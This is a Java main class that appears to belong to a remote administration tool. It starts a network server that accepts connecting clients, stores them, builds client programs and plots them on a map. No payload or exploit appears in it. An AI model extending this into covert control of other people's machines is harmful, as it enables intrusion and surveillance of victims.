package com.melardev.xeytanj;

import com.melardev.xeytanj.concurrent.communicators.reactive.oneway.IReactiveCommunicator;
import com.melardev.xeytanj.concurrent.communicators.reactive.oneway.QueueReactiveCommunicator;
import com.melardev.xeytanj.concurrent.communicators.reactive.twoway.ui.GuiAndBackgroundReactiveCommunicator;
import com.melardev.xeytanj.concurrent.communicators.reactive.twoway.worker.AppAndNetCommunicator;
import com.melardev.xeytanj.concurrent.messaging.events.AppEvent;
import com.melardev.xeytanj.concurrent.messaging.events.ClientAppEvent;
import com.melardev.xeytanj.enums.Action;
import com.melardev.xeytanj.enums.Language;
import com.melardev.xeytanj.enums.Subject;
import com.melardev.xeytanj.enums.Target;
import com.melardev.xeytanj.errors.IOStorageException;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.maps.ClientGeoStructure;
import com.melardev.xeytanj.models.BuildClientInfoStructure;
import com.melardev.xeytanj.models.Client;
import com.melardev.xeytanj.services.IAppMessages;
import com.melardev.xeytanj.services.builder.CommandLineClientBuilder;
import com.melardev.xeytanj.services.config.ConfigService;
import com.melardev.xeytanj.services.data.IStorageService;
import com.melardev.xeytanj.services.ioc.DependencyResolverFactory;
import com.melardev.xeytanj.services.ioc.IAppDependencyResolver;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.INetworkServerService;
import com.melardev.xeytanj.support.MessageDialogFactory;

import java.util.ArrayList;
import java.util.UUID;


public class XeytanJApplication {


    private static XeytanJApplication self;
    private final IStorageService storage;

    private final GuiAndBackgroundReactiveCommunicator guiAndBackgroundReactiveCommunicator;
    private final AppAndNetCommunicator appAndNetCommunicator;

    private IAppDependencyResolver serviceLocator;
    private IUiMediator mediator;
    private INetworkServerService networkServerService;
    private ConfigService config;
    private ILogger logger;
    private IAppMessages messageProvider;


    public XeytanJApplication() {

        self = this;
        serviceLocator = DependencyResolverFactory.getDependencyResolver();
        logger = serviceLocator.lookup(ILogger.class);
        mediator = serviceLocator.lookup(IUiMediator.class);
        config = serviceLocator.lookup(ConfigService.class);
        messageProvider = serviceLocator.lookup(IAppMessages.class);
        storage = serviceLocator.lookup(IStorageService.class);
        storage.setLogger(logger);
        mediator.setLogger(logger);
        mediator.setMessageProvider(messageProvider);


        //guiAndBackgroundReactiveCommunicator = new SwingAndBackgroundReactiveCommunicator();
        // Setup the connection App -> Ui
        guiAndBackgroundReactiveCommunicator = serviceLocator.lookup(GuiAndBackgroundReactiveCommunicator.class, "swing");
        guiAndBackgroundReactiveCommunicator.setLogger(logger);

        // QueueReactiveCommunicator<IGuiEvent> guiCommunicator = new QueueReactiveCommunicator<>();
        QueueReactiveCommunicator<AppEvent> guiCommunicator = new QueueReactiveCommunicator<>();
        guiAndBackgroundReactiveCommunicator.setGuiCommunicator(guiCommunicator);
        guiCommunicator.addListener(mediator);

        // Setup the connection Ui -> App
        // QueueReactiveCommunicator<IGuiEvent> backgroundListener = new QueueReactiveCommunicator<>();
        QueueReactiveCommunicator<AppEvent> backgroundListener = new QueueReactiveCommunicator<>();
        guiAndBackgroundReactiveCommunicator.setBackgroundCommunicator(backgroundListener);
        backgroundListener.addListener(new IReactiveCommunicator.ReactiveCommunicatorListener<AppEvent>() {
            @Override
            public void onEvent(AppEvent event) {
                onUiEvent(event);
            }
        });

        mediator.setCommunicator(guiAndBackgroundReactiveCommunicator);
        guiAndBackgroundReactiveCommunicator.start();

        // They all work, switch the implementation you prefer

        // Sync TCP
        // networkServerService = serviceLocator.lookup(INetworkServerService.class);

        // Async, but not really, using Select
        networkServerService = serviceLocator.lookup(INetworkServerService.class, "server_async_select");

        // Purely asynchronous, using CompletionHandler interfaces
        // networkServerService = serviceLocator.lookup(INetworkServerService.class,  "server_async_completion");

        networkServerService.setLogger(logger);
        networkServerService.setConfig(config);

        // Setup connection Net Subsystem -> App
        appAndNetCommunicator = new AppAndNetCommunicator();
        appAndNetCommunicator.setLogger(logger);
        // QueueReactiveCommunicator<NetEvent> appCommunicator = new QueueReactiveCommunicator<NetEvent>();
        QueueReactiveCommunicator<AppEvent> appCommunicator = new QueueReactiveCommunicator<>();
        networkServerService.setCommunicator(appAndNetCommunicator);
        appCommunicator.addListener(new IReactiveCommunicator.ReactiveCommunicatorListener<AppEvent>() {
            @Override
            public void onEvent(AppEvent event) {
                onNetEvent(event);
            }
        });

        appAndNetCommunicator.setAppSide(appCommunicator);

        // Setup connection App -> Net Subsystem
        // QueueReactiveCommunicator<NetEvent> netCommunicator = new QueueReactiveCommunicator<NetEvent>();
        QueueReactiveCommunicator<AppEvent> netCommunicator = new QueueReactiveCommunicator<>();
        netCommunicator.addListener(networkServerService);

        appAndNetCommunicator.setNetSide(netCommunicator);
        appAndNetCommunicator.start();

        Runtime.getRuntime().addShutdownHook(new Thread() {
            @Override
            public void run() {
                cleanup();
            }
        });
    }

    public static XeytanJApplication getInstance() {
        return self;
    }


    public void showMainFrameAndInitModules() {
        mediator.showMainFrame();
    }

    public void run() {
        logger.traceCurrentMethodName();

        if (config.hasAcceptedDisclaimer()) {
            Language lang = config.getPreferredLanguage();
            if (lang == null) {
                mediator.showLanguageSelectorDialog();
                return;
            } else {
                messageProvider.setLocaleForLanguage(lang);
            }

            /*
            if (!config.hasGoneThroughInstallation()) {
                mediator.showInstaller();
                return;
            }
            */

            AppEvent uiEvent = new AppEvent();
            uiEvent.setTarget(Target.APPLICATION);
            uiEvent.setAction(Action.START);

            AppEvent netEvent = new AppEvent();
            netEvent.setTarget(Target.SERVER);
            netEvent.setAction(Action.START);

            guiAndBackgroundReactiveCommunicator.queueToGuiAsync(uiEvent);
            appAndNetCommunicator.queueToNetAsync(netEvent);

        } else {
            mediator.showDisclaimerDialog();
        }
    }


    private void onUiEvent(AppEvent event) {
        appAndNetCommunicator.queueToNetAsync(event);
    }

    public void onNetEvent(AppEvent event) {
        logger.traceCurrentMethodName();

        if (event.getTarget() == Target.APPLICATION) {
            // TODO: work on this one
            Language lang = config.getPreferredLanguage();
            if (lang != null) {
                messageProvider.setLocaleForLanguage(lang);
                showMainFrameAndInitModules();
            } else
                showLanguagePickerWindow();
        } else if (event.getClass() == ClientAppEvent.class) {
            Client client = ((ClientAppEvent) event).getClient();
            if (event.getSubject() == Subject.CONNECTION) {
                if (event.getAction() == Action.START) {
                    if (config.usingDb()) {
                        IStorageService storage = serviceLocator.lookup(IStorageService.class);

                        try {
                            storage.insertClient(client);
                        } catch (IOStorageException e) {
                            MessageDialogFactory.showErrorMessageAsync(
                                    "Database Error",
                                    e.getLocalizedMessage());
                        }
                    }
                }
            }
        }

        guiAndBackgroundReactiveCommunicator.queueToGuiAsync(event);
    }


    private void cleanup() {

    }


    public void onDisposeError(String message) {
        logger.traceCurrentMethodName();

        serviceLocator = DependencyResolverFactory.getDependencyResolver();
        mediator = serviceLocator.lookup(IUiMediator.class);
        mediator.showDialogMessageError(message);

    }


    private void showLanguagePickerWindow() {
        //     mediator.showLanguageSelectorDialog(null);
    }


    public void onLanguageSelected(Language lang) {
        messageProvider.setLocaleForLanguage(lang);
        showMainFrameAndInitModules();
    }

    public void onLanguageUiClosed() {
        showMainFrameAndInitModules();
    }


    public void onBuildClientRequested(BuildClientInfoStructure buildClientInfoStructure) {
        CommandLineClientBuilder builder = serviceLocator.lookup(CommandLineClientBuilder.class);
        boolean success = builder.build(buildClientInfoStructure);

        if (success)
            mediator.closeBuilderUi();
    }


    public ArrayList<Client> getLocations() {
        ArrayList<Client> locations = new ArrayList<>();
        //lookup from DB before so when the map is created , the marker on top will be from the connected clients
        //and not from the DB which may be disconnected
        IStorageService storage = serviceLocator.lookup(IStorageService.class);
        locations.addAll(storage.getAllClients());

        locations.addAll(networkServerService.getAllClients());
        return locations;
    }


    public void onShowMapRequested() {
        ArrayList<Client> clients = new ArrayList<>();
        clients.addAll(storage.getAllClients());
        clients.addAll(networkServerService.getAllClients());
        // Some fake clients

        Client client = new Client(UUID.randomUUID());
        client.setGeoData(new ClientGeoStructure("Paris", "France", 0.2, 2.2));
        clients.add(client);

        client = new Client(UUID.randomUUID());
        client.setGeoData(new ClientGeoStructure("Madrid", "Spain", 0.2, 2.2));
        clients.add(client);

        client = new Client(UUID.randomUUID());
        client.setGeoData(new ClientGeoStructure("Berlin", "Germany", 0.2, 2.2));
        clients.add(client);

        mediator.showMap(config.getGoogleMapsKey(), clients);
    }

    public static void main(String[] args) {
        // Run App in a separate thread
        XeytanJApplication xeytanJApplication = new XeytanJApplication();
        xeytanJApplication.run();
    }
}
